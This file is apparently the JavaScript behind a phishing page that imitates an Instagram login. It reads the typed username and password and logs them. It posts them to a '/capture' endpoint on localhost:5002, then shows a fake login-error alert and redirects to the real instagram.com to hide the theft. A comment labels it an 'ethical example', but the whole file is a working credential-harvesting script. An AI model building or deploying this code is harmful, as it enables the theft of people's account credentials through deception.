document.addEventListener("DOMContentLoaded", function () {
  const loginFormButton = document.querySelector(".login-form-button");

  loginFormButton.addEventListener("click", async function (event) {
    event.preventDefault(); // Empêcher le rechargement de la page

    const username = document.querySelector("input[type='text']").value;
    const password = document.querySelector("input[type='password']").value;

    if (!username || !password) {
      alert("Veuillez remplir tous les champs.");
      return;
    }

    console.log("Tentative de connexion détectée !");
    console.log("Nom d'utilisateur:", username);
    console.log("Mot de passe:", password);

    // 🔴 Envoyer les données à un serveur pour stockage (exemple éthique)
    try {
      const response = await fetch("http://localhost:5002/capture", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password }),
      });

      if (response.ok) {
        alert("Erreur de connexion !");
        window.location.replace("https://www.instagram.com");
      } else {
        alert("Erreur lors de la capture des données.");
        window.location.replace("https://www.instagram.com");
      }
    } catch (error) {
      console.error("Erreur réseau :", error);
      alert("Une erreur réseau est survenue. Veuillez réessayer.");
      window.location.replace("https://www.instagram.com");
    }
  });
});
